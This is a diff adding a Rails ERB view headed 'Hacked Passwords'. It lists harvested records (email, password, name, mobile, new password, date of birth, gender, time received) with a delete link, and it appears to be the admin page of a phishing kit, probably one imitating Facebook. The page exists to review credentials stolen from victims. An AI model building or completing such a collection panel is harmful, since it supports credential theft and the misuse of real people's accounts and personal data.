@@ -1,0 +1,50 @@
+
+<br>
+
+
+<p id="notice"><%= notice %></p>
+
+
+
+<table align="center">
+  <thead>
+  <tr>
+    <td style="border: groove;width: 12cm;background-color: forestgreen;color: black" align="center" colspan="10"><h1 align="center">Hacked Passwords</h1></td>
+  </tr>
+  <tr style="border: groove">
+
+    <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Email</td>
+    <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Password</td>
+    <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Firstname</td>
+    <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Surname</td>
+    <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Mobile</td>
+    <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">New password</td>
+    <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Dob</td>
+    <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Gender</td>
+    <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Received at</td>
+    <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Delete</td>
+  </tr>
+  </thead>
+
+  <tbody>
+  <% @fbs.each do |fb| %>
+      <tr>
+        <td style="border: groove;width: 6cm;height: 0.5cm" align="center" ><%= fb.email %></td>
+        <td style="border: groove;width: 6cm;height: 0.5cm" align="center" ><%= fb.password %></td>
+        <td style="border: groove;width: 6cm;height: 0.5cm" align="center" ><%= fb.firstname %></td>
+        <td style="border: groove;width: 6cm;height: 0.5cm" align="center" ><%= fb.surname %></td>
+        <td style="border: groove;width: 6cm;height: 0.5cm" align="center" ><%= fb.mobile %></td>
+        <td style="border: groove;width: 6cm;height: 0.5cm" align="center" ><%= fb.newpassword %></td>
+        <td style="border: groove;width: 6cm;height: 0.5cm" align="center" ><%= fb.dob %></td>
+        <td style="border: groove;width: 6cm;height: 0.5cm" align="center" ><%= fb.gender %></td>
+        <td style="border: groove;width: 6.5cm;height: 0.5cm" align="center">Date: <%=fb.created_at.strftime("%d %b. %Y")%>, Time: <%= fb.created_at.strftime("%I:%M %p")%></td>
+        <td style="border: groove;width: 6cm;height: 0.5cm" align="center" ><%= link_to 'Destroy', fb, method: :delete, data: { confirm: 'Are you sure?' } %></td>
+      </tr>
+  <% end %>
+  </tbody>
+</table>
+
+<br>
+
+
+
